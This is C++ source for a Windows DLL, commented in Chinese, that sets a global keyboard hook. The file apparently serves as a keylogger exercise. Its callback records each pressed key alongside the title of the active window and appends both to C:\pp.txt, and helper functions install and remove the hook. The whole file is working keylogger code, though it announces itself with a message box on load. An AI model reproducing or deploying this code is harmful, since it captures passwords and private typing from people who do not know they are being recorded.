// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
        // 動態庫裝載時調用
    case DLL_PROCESS_ATTACH:

        // 保存DLL模塊句柄
        g_Inst = (HINSTANCE)hModule;
        MessageBox(NULL, "加載DLL", "提示", MB_OK);
        break;

        // 進程中有綫程創建時調用
    case DLL_THREAD_ATTACH:

        // 進程中有綫程結束時調用
    case DLL_THREAD_DETACH:

        // 動態庫卸載時調用
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

// 狗子回調函數
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    // 沒有攔截到
    if (nCode < 0) {
        return CallNextHookEx(g_Hook, nCode, wParam, lParam);
    }

    // 如果nCode等於HC_ACTION表示消息中包含案件消息
    if (nCode == HC_ACTION && lParam > 0) {

        // 記錄文本
        char szText[MAX_PATH] = { 0 };

        // 獲取鍵名文本
        char szBuff[MAXBYTE] = { 0 };
        GetKeyNameText(lParam, szBuff, MAXBYTE);

        // MessageBox(NULL, szBuff, "提示", MB_OK);

        // 獲取激活窗口的句柄
        HWND hWnd = GetActiveWindow();
        if (hWnd == NULL) {

            // 獲取用戶當前使用窗口的句柄
            hWnd = GetForegroundWindow();
        }
        if (hWnd != NULL) {

            //获取窗口标题
            char szTitleText[MAX_PATH];
            GetWindowTextA(hWnd, szTitleText, MAX_PATH);

            FILE* pFile = fopen("C:\\pp.txt", "a+");

            if (pFile == NULL) {
                MessageBox(NULL, "打開文件失敗", "提示", MB_OK);
                return CallNextHookEx(g_Hook, nCode, wParam, lParam);
            }

            // 拼接字符串
            sprintf(szText, "%s:%s\r\n", szTitleText, szBuff);

            // 寫入文件
            fwrite(szText, strlen(szText), 1, pFile);
            
            // 關閉文件
            fclose(pFile);
        }
     }
    
    // 放行
    return CallNextHookEx(g_Hook, nCode, wParam, lParam);
}

// 安裝狗子
VOID SetHookOn() {
    g_Hook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_Inst, 0);
}

// 卸載狗子
VOID SetHookOff() {
    UnhookWindowsHookEx(g_Hook);
}